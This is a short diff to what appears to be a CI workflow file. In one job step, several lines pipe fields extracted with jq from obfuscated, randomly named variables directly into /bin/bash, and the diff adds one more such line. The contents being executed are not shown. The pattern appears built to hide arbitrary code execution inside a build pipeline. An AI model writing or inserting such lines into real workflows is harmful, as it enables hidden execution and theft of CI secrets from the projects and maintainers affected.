@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$dfwb33260" | jq -r .ziz195 | /bin/bash
           printf '%s' "$gtclf16" | jq -r .dq65 | /bin/bash
           printf '%s' "$h300" | jq -r .yzzka691 | /bin/bash
+          printf '%s' "$krr18" | jq -r .p73 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
